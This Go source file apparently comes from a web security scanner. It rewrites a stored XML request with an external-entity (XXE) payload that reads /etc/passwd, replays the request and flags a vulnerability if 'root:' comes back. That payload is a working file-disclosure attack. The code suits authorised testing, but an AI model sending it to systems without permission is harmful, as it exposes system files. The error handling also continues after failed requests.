package repeatRequestHandlers

import (
	"fmt"
	"github.com/sirupsen/logrus"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
)

func ScanRequestForXXE(responseWriter http.ResponseWriter, request *http.Request) {
	dbRequest, err := getRequestFromDatabase(responseWriter, request)
	if err != nil {
		logrus.Error(err)
		return
	}

	if strings.Contains(dbRequest.Request, "<?xml") {
		regExp := regexp.MustCompile(`<\?xml .*\?>`)
		xmlVer := regExp.FindString(dbRequest.Request)
		dbRequest.Request = regExp.ReplaceAllLiteralString(dbRequest.Request, xmlVer+
			"\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY>\n"+
			"<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n"+
			"<foo>&xxe;</foo>\n")
	}

	client := http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	newRequest, err := formRequest(dbRequest)
	if err != nil {
		logrus.Error(err)
	}

	response, err := client.Do(newRequest)
	if err != nil {
		logrus.Error(err)
	}

	//handlers.CopyHttpHeaders(response.Header, responseWriter.Header())
	//responseWriter.WriteHeader(response.StatusCode)
	//_, _ = io.Copy(responseWriter, response.Body)

	textResp, err := ioutil.ReadAll(response.Body)
	if err != nil {
		logrus.Warn("Can't search for vulnerability")
	}
	logrus.Info("SCANNING FOR XXE")
	if strings.Contains(string(textResp), "root:") {
		logrus.Info("HAS XXE")
		_, _ = fmt.Fprintf(responseWriter, "------- WARNING: Request contains XXE vulnerability\n")
	} else {
		logrus.Info("NO XXE")
		_, err = fmt.Fprintf(responseWriter, "------- No XXE vulnerabilities detected\n")
		logrus.Error(err)
	}

	_ = response.Body.Close()
}
